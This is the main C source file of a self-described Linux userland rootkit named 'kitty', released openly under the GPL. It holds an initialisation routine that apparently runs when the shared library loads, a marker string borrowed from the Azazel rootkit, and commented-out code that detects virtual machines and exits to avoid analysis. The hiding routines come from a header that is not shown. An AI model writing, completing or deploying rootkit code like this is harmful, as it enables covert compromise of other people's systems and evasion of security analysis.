/**
 * @file kitty.c
 * @author 0xff
 * @brief Linux userland rootkit.  
 * @version 1.0
 * @date 2022-06-29
 * 
 * @copyright Copyright (c) 2022 0xff
 * 
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 * 
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.

 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org/licenses/>. 
 */

#include "kitty.h"
#include "hide.h"

/* Shows up in strings - Got the idea from the "Azazel" rootkit. */
char *truth = "May God have mercy.";

void init(void) {

#ifdef DEBUG
  printf("[-] kitty_debug.so loaded.\n");
#endif 

// #ifdef DEBUG
//   printf("[-] checking if the rootkit is being used on a VM...\n");
// #endif
// 
//   if (vm_bios() || vm_sys() || hypervisor_flag())
// #ifdef DEBUG
//   printf("[-] VM detected, terminating program...\n");
// #endif
//     exit(EXIT_FAILURE);
}
